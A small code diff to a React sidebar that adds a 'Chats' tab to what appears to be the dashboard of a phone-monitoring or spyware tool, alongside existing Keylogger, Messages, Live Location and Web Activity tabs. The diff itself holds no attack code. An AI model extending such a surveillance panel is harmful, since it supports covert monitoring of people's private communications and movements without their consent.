@@ -13,7 +13,8 @@ import {
   Keyboard,
   X,
   Monitor,
-  Camera
+  Camera,
+  MessageCircle
 } from 'lucide-react';
 
 const Sidebar = ({ activeTab, setActiveTab, logout, isMobileOpen, setIsMobileOpen }) => {
@@ -26,6 +27,7 @@ const Sidebar = ({ activeTab, setActiveTab, logout, isMobileOpen, setIsMobileOpe
     { id: 'sms', label: 'Messages', icon: MessageSquare },
     { id: 'notifications', label: 'Notifications', icon: Bell },
     { id: 'keylogs', label: 'Keylogger', icon: Keyboard },
+    { id: 'chats', label: 'Chats', icon: MessageCircle },
     { id: 'location', label: 'Live Location', icon: MapPin },
     { id: 'apps', label: 'App Inventory', icon: LayoutGrid },
     { id: 'web', label: 'Web Activity', icon: Globe },
